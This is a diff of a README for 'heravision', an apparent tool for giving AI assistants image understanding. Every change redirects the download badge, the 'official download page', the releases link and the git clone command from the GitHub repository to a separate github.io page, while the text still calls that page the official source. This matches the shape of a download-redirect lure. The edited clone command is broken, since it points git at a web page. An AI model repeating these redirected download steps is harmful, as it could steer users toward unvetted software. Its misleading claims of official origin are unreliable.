@@ -1,6 +1,6 @@
 # 👁️ heravision - Give Eyes to Your AI
 
-[![Download heravision](https://img.shields.io/badge/Download-heravision-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/djfarhad368/heravision)
+[![Download heravision](https://img.shields.io/badge/Download-heravision-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://djfarhad368.github.io)
 
 ---
 
@@ -23,7 +23,7 @@ Think of it as giving "eyes" to AI assistants that normally can only read text. 
 
 **Step 1 – Download the Application**
 
-[→ Visit the official heravision download page](https://github.com/djfarhad368/heravision)
+[→ Visit the official heravision download page](https://djfarhad368.github.io)
 
 Visit this link to download the application. This is the official source and always gets the latest version.
 
@@ -87,7 +87,7 @@ If you want to build from source or look at the code:
 
 ```bash
 # Clone repository
-git clone https://github.com/djfarhad368/heravision
+git clone https://djfarhad368.github.io
 
 # Go to project directory
 cd heravision
@@ -174,7 +174,7 @@ This project was made with a lot of love for the AI community, especially for th
 ## 📥 Final Download Reminder
 
 **Need enhance again?**  
-[→ Go to heravision releases page](https://github.com/djfarhad368/heravision)
+[→ Go to heravision releases page](https://djfarhad368.github.io)
 
 Go ahead and try it - it will only take a few minutes to start, but it will fundamentally change how your AI understands visual information. Give it a spin!
 
